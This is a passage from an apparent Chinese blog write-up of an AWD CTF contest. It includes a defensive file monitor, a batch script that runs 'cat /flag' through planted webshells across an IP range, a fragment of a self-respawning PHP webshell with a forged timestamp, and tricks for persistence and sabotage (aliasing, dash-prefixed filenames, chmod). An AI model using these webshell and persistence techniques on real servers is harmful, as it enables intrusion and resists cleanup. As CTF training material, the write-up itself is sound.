            if Special_path_str not in filepath:
                shutil.copy2(filepath, Special_path['bak'])
    if __name__ == '__main__':
        print u'---------start------------'
        for value in Special_path:
            mkdir_p(Special_path[value])
        # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件
        ORIGIN_FILE_LIST = getfilelist(CWD)
        FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)
        backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG
        print u'[*] pre work end!'
        while True:
            file_list = getfilelist(CWD)
            # 移除新上传文件
            diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))
            if len(diff_file_list) != 0:
                # import pdb;pdb.set_trace()
                for filepath in diff_file_list:
                    try:
                        f = open(filepath, 'r').read()
                    except Exception, e:
                        break
                    if Special_string not in f:
                        try:
                            print u'[*] webshell find : ' + getUnicode(filepath)
                            shutil.move(filepath, os.path.join(Special_path['webshell'], ntpath.basename(filepath) + '.txt'))
                        except Exception as e:
                            print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filepath)
                        try:
                            f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                            f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + '\n')
                            f.close()
                        except Exception as e:
                            print u'[-] log error : file move error: ' + getUnicode(e)
            # 防止任意文件被修改,还原被修改文件
            md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)
            for filekey in md5_dict:
                if md5_dict[filekey] != FILE_MD5_DICT[filekey]:
                    try:
                        f = open(filekey, 'r').read()
                    except Exception, e:
                        break
                    if Special_string not in f:
                        try:
                            print u'[*] file had be change : ' + getUnicode(filekey)
                            shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt'))
                            shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey)
                        except Exception as e:
                            print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filekey)
                        try:
                            f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                            f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\n')
                            f.close()
                        except Exception as e:
                            print u'[-] log error : done_diff: ' + getUnicode(filekey)
                            pass
            time.sleep(2)
            # print '[*] ' + getUnicode(time.ctime())
`日志分析`  
利用命令行，输入`tailf /var/log/apache2/access.log`  
查看日志文件，进行分析，观察攻击者是以哪个方式进行攻击的。
###  攻击
`批量得到flag脚本:`
    #coding=utf-8
    import requests
    url_head="http://10.100.100."    #网段
    shell_addr="/upload/url/shell.php" #木马路径
    passwd="xiaoma"                    #木马密码
    port=""
    payload = {passwd: 'System(\'cat /flag\');'}
    webshelllist=open("webshelllist.txt","w")
    flag=open("flag.txt","w")
    for i in range(130,160
    ):
        url=url_head+str(i)+":"+port+shell_addr
        try:
            res=requests.post(url,payload,timeout=1)
            if res.status_code == requests.codes.ok:
                result = url+" connect shell sucess,flag is "+res.text
                print (result)
                flag.write(result+"\n");
                print >>flag,result
                print >>webshelllist,url+","+passwd
            else:
                print ("shell 404")
        except:
            print (url+" connect shell fail")
    webshelllist.close()
    flag.close()
`批量提交flag脚本：`
    def submit(flag, token):
        url = "wangzhi"
        pos = {
            "flag":flag
            "token":token
        }
        print "[+] Submiting flag : [%s]" % (pos)
        response = requests.post(url,data=data)
        content = response.content
        print "[+] Content : %s " % (content)
        if failed in content:
            print "[-]failed"
            return False
        else:
            print "[+] Success!"
            return True
但是很可惜，在这次 **“awd”** 比赛中，并没有用上。而且在用的时候，需要进行一些修改，调试。
`种不死马`  
在比赛过程中，可以抢一波预留后门，得到shell，然后往服务器里面种不死马，进一步维护自己的权限，然后可以用分裂马等一些马传上去。  
对于不死马，GitHub上面也有好多，这里给出我自己的一个不死马。有兴趣的可以在本地尝试
     ';
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" .shell.php');
        usleep(5000);
    }
    ?>
而对于删除不死马，首先需要找到他的进程，关掉进程之后，才能删掉，不然会一直生成，删不掉。  
而对于关闭进程，这里贴出自己用的命令
     ps aux | grep www-data | awk '{print $2}' | xargs kill -9 //删除www-date用户下的所有进程
    接着直接删除不死马文件
###  骚姿势
在awd比赛中，往往有一些大师傅热衷于去搅屎，而在这里也贴出自己团队大师傅说的一些骚姿势
**起别名**
在Linux系统中，可以通过`alias`对系统命令起一些别名，这样子用本来的名字时会出现你事先设置好的东西，而不是执行这个命令。  
比如：`alias cat="echo`date`|md5sum|cut -d ' ' -f1||"`
这个命令用于在输入`cat`时输出一串类似flag的字符串。
想要删除时只需要输入`alias -a`即可。
**软链接**
在得到对方shell之后，对方肯定会发现后门文件，就会想办法进行修补，这时候可以用Linux中的软链接功能，把flag软链接道到一个可写可读文件中。
**文件名称**
对于文件名称，一般写入不死马用的都是.xxx.php隐藏起来，但是一看就知道有很大嫌疑，所以名字可以用-xxx.php来命名，这样子当你用命令行删除时，Linux会默认-后面是命令参数而无法执行，只能手动去删除。  
效果图同上
**修改文件权限**
对于一些文件有写权限的可以选择修改他的权限，让别人无法往里面写入文件  
命令`chmod 555 指定文件路径`
**其他搅屎操作**
很多的，例如封对手IP了什么的，好多搅屎操作都是在大师傅们的无聊中搞出来了，不过这样的awd打起来不是更有意思吗？
## 尾言
本来打算是这次参加线下赛之后回来总结一下自己的一些心得的，但是怎么说呢，这个线下赛一言难尽，也挺不错的，最起码接触了一下线下awd实战，不管怎样，这对于之后的学习都会有帮助的，继续加油！